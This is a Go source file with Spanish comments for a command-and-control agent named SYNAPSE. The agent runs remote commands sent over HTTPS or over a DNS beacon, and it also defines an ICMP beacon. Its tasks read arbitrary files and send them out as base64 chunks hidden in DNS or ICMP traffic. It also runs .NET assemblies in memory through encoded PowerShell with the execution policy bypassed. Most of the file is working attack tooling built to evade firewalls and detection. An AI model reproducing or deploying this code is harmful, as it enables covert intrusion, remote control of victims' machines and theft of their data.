// FICHERO: agente.go
package main

import (
	//"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"fmt"
	//"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	//"github.com/ropnop/go-clr"
	"github.com/spf13/cobra"
)

// --- TIPOS DE DATOS PARA EL AGENTE ---

type CommandRequest struct {
	Comando string   `json:"comando"`
	Args    []string `json:"args"`
}

type CommandResponse struct {
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

// --- VARIABLES GLOBALES PARA LOS FLAGS ---
var agentPort, apiKey, agentMode, c2Domain, c2Server, agentID string
var beaconInterval time.Duration

// --- LÓGICA DE LOS COMANDOS ---

func NewAgentCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "agent",
		Short: "Inicia el agente para control remoto (C2)",
		Long: `Ejecuta un servidor para control remoto en modo HTTPS (rápido y seguro)
o en modo DNS (lento y sigiloso para evadir firewalls).`,
		Run: func(cmd *cobra.Command, args []string) {
			switch strings.ToLower(agentMode) {
			case "https":
				if apiKey == "" {
					log.Fatal("Error: El modo HTTPS requiere una clave API (-k).")
				}
				startAgentServer(agentPort, apiKey)
			case "dns":
				if c2Domain == "" || c2Server == "" || agentID == "" {
					log.Fatal("Error: El modo DNS requiere un dominio C2 (-d), un servidor C2 (-s) y un ID de agente (-I).")
				}
				startDNSBeacon(agentID, c2Domain, c2Server, beaconInterval)
			default:
				log.Fatalf("Error: Modo de agente '%s' no válido. Modos disponibles: https, dns", agentMode)
			}
		},
	}

	cmd.Flags().StringVar(&agentMode, "mode", "https", "Modo de operación del agente (https o dns)")
	cmd.Flags().StringVarP(&agentPort, "port", "p", "4443", "Puerto de escucha para el modo HTTPS")
	cmd.Flags().StringVarP(&apiKey, "key", "k", "", "Clave API secreta para el modo HTTPS")
	cmd.Flags().StringVarP(&c2Domain, "domain", "d", "", "Dominio base para el C2 DNS")
	cmd.Flags().StringVarP(&c2Server, "server", "s", "", "IP del servidor DNS C2")
	cmd.Flags().StringVarP(&agentID, "id", "I", "synapse01", "ID único para este agente")
	cmd.Flags().DurationVarP(&beaconInterval, "interval", "t", 60*time.Second, "Intervalo de beacon para el C2 DNS")

	return cmd
}

// --- LÓGICA DEL MODO HTTPS ---
func startAgentServer(port, key string) {
	tlsCert, err := generateInMemoryCertificate()
	if err != nil {
		log.Fatalf("Error fatal al generar el certificado TLS en memoria: %v", err)
	}
	mux := http.NewServeMux()
	commandHandler := http.HandlerFunc(handleCommand)
	mux.Handle("/command", authMiddleware(commandHandler, key))
	mux.HandleFunc("/", handleRoot)
	server := &http.Server{
		Addr:      ":" + port,
		Handler:   mux,
		TLSConfig: &tls.Config{Certificates: []tls.Certificate{*tlsCert}},
	}
	log.Printf("Iniciando agente SYNAPSE en modo seguro (HTTPS) en el puerto %s...", port)
	log.Println("Utilizando certificados TLS generados en memoria (no se escriben en disco).")
	err = server.ListenAndServeTLS("", "")
	if err != nil {
		log.Fatalf("Error fatal al iniciar el servidor del agente: %v", err)
	}
}

func handleRoot(w http.ResponseWriter, r *http.Request) { fmt.Fprintln(w, "SYNAPSE Agent Activo.") }

func authMiddleware(next http.Handler, expectedKey string) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-API-Key") != expectedKey {
			http.Error(w, "Acceso no autorizado", http.StatusUnauthorized)
			log.Printf("Intento de conexión fallido desde %s.", r.RemoteAddr)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// --- LÓGICA DEL MODO DNS ---
func startDNSBeacon(id, domain, server string, interval time.Duration) {
	log.Printf("Iniciando agente en modo C2 por DNS. Beacon cada %s", interval)
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{Timeout: 10 * time.Second}
			return d.DialContext(ctx, "udp", server+":53")
		},
	}
	ticker := time.NewTicker(interval)
	for {
		<-ticker.C
		log.Println("[Beacon] Pidiendo tareas al C2...")
		taskQuery := fmt.Sprintf("%s.tasks.%s", id, domain)
		txtRecords, err := r.LookupTXT(context.Background(), taskQuery)
		if err != nil {
			log.Printf("ADVERTENCIA: No se pudo resolver la petición de tareas: %v", err)
			continue
		}
		if len(txtRecords) > 0 && txtRecords[0] != "none" {
			taskData := txtRecords[0]
			log.Printf("[+] ¡Tarea recibida!: %s", taskData)
			var req CommandRequest
			if err := json.Unmarshal([]byte(taskData), &req); err == nil {
				output, err := executeAgentTask(req)
				result := output
				if err != nil {
					result = "ERROR: " + err.Error() + "\n" + result
				}
				log.Println("[Beacon] Enviando resultados...")
				chunks := chunkString(result, 60)
				for i, chunk := range chunks {
					chunkBase64 := base64.URLEncoding.EncodeToString([]byte(chunk))
					resultQuery := fmt.Sprintf("%s.%d.%s.results.%s", chunkBase64, i, id, domain)
					r.LookupHost(context.Background(), resultQuery)
					time.Sleep(100 * time.Millisecond)
				}
				log.Println("[Beacon] Resultados enviados.")
			}
		} else {
			log.Println("[Beacon] No hay tareas pendientes.")
		}
	}
}

// --- LÓGICA DEL MODO ICMP (que antes faltaba en la lógica del 'switch') ---
func startICMPBeacon(id, serverIP string, interval time.Duration) {
	log.Printf("Iniciando agente en modo C2 por ICMP. Beacon cada %s", interval)
	log.Printf("ID del Agente: %s", id)
	log.Printf("Servidor C2 ICMP: %s", serverIP)
	
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatalf("Error al iniciar el listener ICMP. ¿Se está ejecutando con privilegios de root/Administrador?: %v", err)
	}
	defer conn.Close()
	
	ticker := time.NewTicker(interval)
	for {
		<-ticker.C
		log.Println("[Beacon] Pidiendo tareas al C2 via ICMP...")

		payload := []byte(id + ":task")
		pingMessage := icmp.Message{
			Type: ipv4.ICMPTypeEcho, Code: 0,
			Body: &icmp.Echo{ID: os.Getpid() & 0xffff, Seq: 1, Data: payload},
		}
		pingBytes, _ := pingMessage.Marshal(nil)
		_, err := conn.WriteTo(pingBytes, &net.IPAddr{IP: net.ParseIP(serverIP)})
		if err != nil {
			log.Printf("ADVERTENCIA: No se pudo enviar el beacon ICMP: %v", err)
			continue
		}

		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		replyBytes := make([]byte, 1500)
		n, _, err := conn.ReadFrom(replyBytes)
		if err != nil {
			log.Printf("ADVERTENCIA: No se recibió respuesta del C2: %v", err)
			continue
		}

		replyMessage, _ := icmp.ParseMessage(1, replyBytes[:n])
		if replyMessage.Type == ipv4.ICMPTypeEchoReply {
			echoReply, ok := replyMessage.Body.(*icmp.Echo)
			if ok {
				taskData := string(echoReply.Data)
				parts := strings.SplitN(taskData, ":", 2)
				if len(parts) == 2 && parts[0] == id && parts[1] != "none" {
					log.Printf("[+] ¡Tarea recibida!: %s", parts[1])

					var req CommandRequest
					if err := json.Unmarshal([]byte(parts[1]), &req); err == nil {
						output, err := executeAgentTask(req)
						result := output
						if err != nil { result = "ERROR: " + err.Error() + "\n" + result }

						log.Println("[Beacon] Enviando resultados via ICMP...")
						resultBase64 := base64.StdEncoding.EncodeToString([]byte(result))
						
						// Dividir el resultado en trozos para enviarlo
						chunks := chunkString(resultBase64, 60) // Base64 de 60 bytes
						for i, chunk := range chunks {
							// Formato del payload: <agent_id>:result:<chunk_index>:<total_chunks>:<chunk_data_b64>
							resultPayload := []byte(fmt.Sprintf("%s:result:%d:%d:%s", id, i, len(chunks), chunk))
							resultPing := icmp.Message{
								Type: ipv4.ICMPTypeEcho, Code: 0,
								Body: &icmp.Echo{ID: os.Getpid() & 0xffff, Seq: i + 2, Data: resultPayload},
							}
							resultBytes, _ := resultPing.Marshal(nil)
							conn.WriteTo(resultBytes, &net.IPAddr{IP: net.ParseIP(serverIP)})
							time.Sleep(100 * time.Millisecond)
						}
					}
				} else {
					log.Println("[Beacon] No hay tareas pendientes.")
				}
			}
		}
	}
}

// --- LÓGICA DE EJECUCIÓN DE TAREAS (COMPARTIDA) ---
func handleCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Método no permitido", http.StatusMethodNotAllowed)
		return
	}
	var req CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Error al decodificar: "+err.Error(), http.StatusBadRequest)
		return
	}
	log.Printf("Orden recibida desde %s: comando='%s', args=%v", r.RemoteAddr, req.Comando, req.Args)
	output, err := executeAgentTask(req)
	resp := CommandResponse{Output: output}
	if err != nil {
		resp.Error = err.Error()
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func executeAgentTask(req CommandRequest) (string, error) {
	switch req.Comando {
	case "internal-download":
		if len(req.Args) < 1 {
			return "", fmt.Errorf("se requiere la ruta del fichero")
		}
		filePath := req.Args[0]
		log.Printf("Agente intentando leer: %s", filePath)
		fileBytes, err := os.ReadFile(filePath)
		if err != nil {
			log.Printf("Error del agente al leer '%s': %v", filePath, err)
			return "", fmt.Errorf("no se pudo leer el fichero: %w", err)
		}
		return base64.StdEncoding.EncodeToString(fileBytes), nil
	case "execute-assembly":
		// --- INICIO DE LA NUEVA IMPLEMENTACIÓN ---
		if runtime.GOOS != "windows" { return "", fmt.Errorf("solo soportado en Windows") }
		if len(req.Args) < 1 { return "", fmt.Errorf("se requiere el ensamblado en Base64") }
		
		assemblyBase64 := req.Args[0]
		assemblyArgsStr := ""
		if len(req.Args) > 1 {
			// Unimos los argumentos para el ensamblado en un solo string
			assemblyArgsStr = strings.Join(req.Args[1:], " ")
		}

		log.Println("Ejecutando ensamblado .NET en memoria via PowerShell Reflection...")

		// 1. Construir el script de PowerShell
		psScript := fmt.Sprintf(`
			$AssemblyBytes = [System.Convert]::FromBase64String('%s')
			$Assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)
			$EntryPoint = $Assembly.EntryPoint
			$Parameters = @(%s)
			$EntryPoint.Invoke($null, @($Parameters))
		`, assemblyBase64, assemblyArgsStr)

		// 2. Codificar el script completo en Base64 para pasarlo a powershell.exe -e
		encodedScript := base64.StdEncoding.EncodeToString([]byte(psScript))
		
		// 3. Ejecutar el script
		cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encodedScript)
		output, err := cmd.CombinedOutput()
		if err != nil { log.Printf("Error durante la ejecución en memoria via PowerShell: %v", err) }
		
		return string(output), err
		// --- FIN DE LA NUEVA IMPLEMENTACIÓN ---
	}
	executable, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("no se pudo encontrar el ejecutable: %w", err)
	}
	fullArgs := append([]string{req.Comando}, req.Args...)
	cmd := exec.Command(executable, fullArgs...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Error al ejecutar '%s': %v. Salida: %s", req.Comando, err, string(output))
	}
	return string(output), err
}

// --- FUNCIONES DE UTILIDAD ---
func generateInMemoryCertificate() (*tls.Certificate, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}
	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, err
	}
	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject:      pkix.Name{Organization: []string{"SYNAPSE Agent"}},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().AddDate(1, 0, 0),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return nil, err
	}
	cert := &tls.Certificate{Certificate: [][]byte{derBytes}, PrivateKey: priv}
	return cert, nil
}

func chunkString(s string, size int) []string {
	var chunks []string
	for len(s) > 0 {
		if len(s) < size {
			size = len(s)
		}
		chunks = append(chunks, s[:size])
		s = s[size:]
	}
	return chunks
}
